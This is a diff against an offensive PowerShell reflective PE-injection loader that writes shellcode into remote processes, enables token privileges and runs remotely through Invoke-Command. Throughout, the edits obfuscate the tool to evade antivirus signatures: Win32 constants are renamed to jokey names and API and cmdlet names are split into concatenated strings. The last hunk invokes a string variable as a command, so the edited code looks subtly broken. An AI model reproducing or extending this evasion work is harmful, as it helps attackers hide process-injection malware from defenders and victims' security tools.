@@ -373,11 +373,11 @@ $RemoteScriptBlock = {
 		
 
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
-		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
+		$TypeBuilder = $ModuleBuilder.DefineType('GROUNDING_STATUS', $Attributes, [System.ValueType], 16)
 		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
 		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
-		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
-		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
+		$GROUNDING_STATUS = $TypeBuilder.CreateType()
+		$Win32Types | Add-Member -MemberType NoteProperty -Name GROUNDING_STATUS -Value $GROUNDING_STATUS
 
 		return $Win32Types
 	}
@@ -393,8 +393,8 @@ $RemoteScriptBlock = {
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
-		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
-		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAPER_GUILLOTINE_READ -Value 0x20
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAPER_GUILLOTINE_READWRITE -Value 0x40
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
@@ -411,9 +411,9 @@ $RemoteScriptBlock = {
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
-		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
-		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
-		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name CHECK_GROUNDING -Value 0x0008
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name GROUND_YOUR_KID -Value 0x0020
+		$Win32Constants | Add-Member -MemberType NoteProperty -Name YOU_ARE_UNGROUNDED -Value 0x2
 		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
 		
 		return $Win32Constants
@@ -501,10 +501,11 @@ $RemoteScriptBlock = {
         $TieShoe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TieShoeAddr, $TieShoeDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name $TieShoeName -Value $TieShoe
 		
-		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
-        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
-        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
+		$HappyMomentName = "Rea" + "dProc" + "essMe" + "mory"
+		$HappyMomentAddr = Get-ProcAddress kernel32.dll $HappyMomentName
+        $HappyMomentDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+        $HappyMoment = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HappyMomentAddr, $HappyMomentDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name HappyMoment -Value $HappyMoment
 		
 		$WeaveRopeName = "Creat" + "eRemo" + "teThre" + "ad"
 		$WeaveRopeAddr = Get-ProcAddress kernel32.dll $WeaveRopeName
@@ -527,10 +528,11 @@ $RemoteScriptBlock = {
         $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
 		
-		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
-        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
-        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
-		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
+		$AddCashName = "Adjust" +"Tok" + "enPrivileges"
+		$AddCashAddr = Get-ProcAddress Advapi32.dll $AddCashName
+        $AddCashDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
+        $AddCash = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddCashAddr, $AddCashDelegate)
+		$Win32Functions | Add-Member -MemberType NoteProperty -Name AddCash -Value $AddCash
 		
 		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
         $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
@@ -823,7 +825,8 @@ $RemoteScriptBlock = {
 
 	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
 	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
-	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+		$DummySplit = "Micro" + "soft." + "Win32." + "Unsa" + "feNative" + "Methods"	
+	    $UnsafeNativeMethods = $SystemAssembly.GetType($DummySplit)
 
 	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
 
@@ -861,7 +864,7 @@ $RemoteScriptBlock = {
 		}
 		
 		[IntPtr]$ThreadToken = [IntPtr]::Zero
-		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.CHECK_GROUNDING -bor $Win32Constants.GROUND_YOUR_KID, $false, [Ref]$ThreadToken)
 		if ($Result -eq $false)
 		{
 			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -873,7 +876,7 @@ $RemoteScriptBlock = {
 					Throw "Unable to impersonate self"
 				}
 				
-				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
+				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.CHECK_GROUNDING -bor $Win32Constants.GROUND_YOUR_KID, $false, [Ref]$ThreadToken)
 				if ($Result -eq $false)
 				{
 					Throw "Unable to OpenThreadToken."
@@ -892,15 +895,15 @@ $RemoteScriptBlock = {
 			Throw "Unable to call LookupPrivilegeValue"
 		}
 
-		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
+		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.GROUNDING_STATUS)
 		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
-		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
+		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.GROUNDING_STATUS)
 		$TokenPrivileges.PrivilegeCount = 1
 		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
-		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
+		$TokenPrivileges.Privileges.Attributes = $Win32Constants.YOU_ARE_UNGROUNDED
 		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
 
-		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
+		$Result = $Win32Functions.AddCash.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
 		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
 		if (($Result -eq $false) -or ($ErrorCode -ne 0))
 		{
@@ -1181,7 +1184,7 @@ $RemoteScriptBlock = {
 			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)
 
 			
-			$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAPER_GUILLOTINE_READWRITE)
 			if ($RSCAddr -eq [IntPtr]::Zero)
 			{
 				Throw "Unable to allocate memory in the remote process for shellcode"
@@ -1202,10 +1205,10 @@ $RemoteScriptBlock = {
 			
 
 			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
+			$Result = $Win32Functions.HappyMoment.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 			if ($Result -eq $false)
 			{
-				Throw "Call to ReadProcessMemory failed"
+				Throw "Call to HappyMoment failed"
 			}
 			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
@@ -1332,7 +1335,7 @@ $RemoteScriptBlock = {
 		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
 		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
 		
-		$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+		$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAPER_GUILLOTINE_READWRITE)
 		if ($RSCAddr -eq [IntPtr]::Zero)
 		{
 			Throw "Unable to allocate memory in the remote process for shellcode"
@@ -1353,10 +1356,10 @@ $RemoteScriptBlock = {
 		
 
 		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
-		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
+		$Result = $Win32Functions.HappyMoment.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
 		{
-			Throw "Call to ReadProcessMemory failed"
+			Throw "Call to HappyMoment failed"
 		}
 		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])
 
@@ -1673,11 +1676,11 @@ $RemoteScriptBlock = {
 			{
 				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
 				{
-					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
+					$ProtectionFlag = $Win32Constants.PAPER_GUILLOTINE_READWRITE
 				}
 				else
 				{
-					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
+					$ProtectionFlag = $Win32Constants.PAPER_GUILLOTINE_READ
 				}
 			}
 			else
@@ -1845,7 +1848,7 @@ $RemoteScriptBlock = {
 
 
 		[UInt32]$OldProtectFlag = 0
-		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAPER_GUILLOTINE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
 		{
 			throw "Call to VirtualProtect failed"
@@ -1863,7 +1866,7 @@ $RemoteScriptBlock = {
 		
 
 		[UInt32]$OldProtectFlag = 0
-		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAPER_GUILLOTINE_READWRITE), [Ref]$OldProtectFlag)
 		if ($Success = $false)
 		{
 			throw "Call to VirtualProtect failed"
@@ -1913,7 +1916,7 @@ $RemoteScriptBlock = {
 				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
 				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
 				
-				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAPER_GUILLOTINE_READWRITE), [Ref]$OldProtectFlag)
 				if ($Success = $false)
 				{
 					throw "Call to VirtualProtect failed"
@@ -1921,7 +1924,7 @@ $RemoteScriptBlock = {
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
 				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
 				
-				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAPER_GUILLOTINE_READWRITE), [Ref]$OldProtectFlag)
 				if ($Success = $false)
 				{
 					throw "Call to VirtualProtect failed"
@@ -1983,7 +1986,7 @@ $RemoteScriptBlock = {
 				Throw "ExitThread address not found"
 			}
 
-			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAPER_GUILLOTINE_READWRITE, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
 				Throw "Call to VirtualProtect failed"
@@ -2035,7 +2038,7 @@ $RemoteScriptBlock = {
 		[UInt32]$OldProtectFlag = 0
 		foreach ($Info in $CopyInfo)
 		{
-			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAPER_GUILLOTINE_READWRITE, [Ref]$OldProtectFlag)
 			if ($Success -eq $false)
 			{
 				Throw "Call to VirtualProtect failed"
@@ -2204,7 +2207,7 @@ $RemoteScriptBlock = {
 			$PEHandle = $Win32Functions.FriendHouse.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			
 
-			$EffectivePEHandle = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+			$EffectivePEHandle = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAPER_GUILLOTINE_READWRITE)
 			if ($EffectivePEHandle -eq [IntPtr]::Zero)
 			{
 				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
@@ -2218,7 +2221,7 @@ $RemoteScriptBlock = {
 			}
 			else
 			{
-				$PEHandle = $Win32Functions.FriendHouse.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				$PEHandle = $Win32Functions.FriendHouse.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAPER_GUILLOTINE_READWRITE)
 			}
 			$EffectivePEHandle = $PEHandle
 		}
@@ -2337,7 +2340,7 @@ $RemoteScriptBlock = {
 				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
 				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
 				
-				$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
+				$RSCAddr = $Win32Functions.FriendHouseEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAPER_GUILLOTINE_READWRITE)
 				if ($RSCAddr -eq [IntPtr]::Zero)
 				{
 					Throw "Unable to allocate memory in the remote process for shellcode"
@@ -2682,13 +2685,16 @@ $charArray32 = $PEBytes32Reversed.ToCharArray()
 [Array]::Reverse($charArray32)
 $PEBytes32 = -join $charArray32
 
+$ArgReplacement = "-" + 'Compu' + 'terName'
+$CommandReplacement = "Invok" + "e-Com" + "mand"
+
 	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
+		$CommandReplacement -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
 	}
 	else
 	{
-		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
+		$CommandReplacement -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) $ArgReplacement $ComputerName
 	}
 }
 
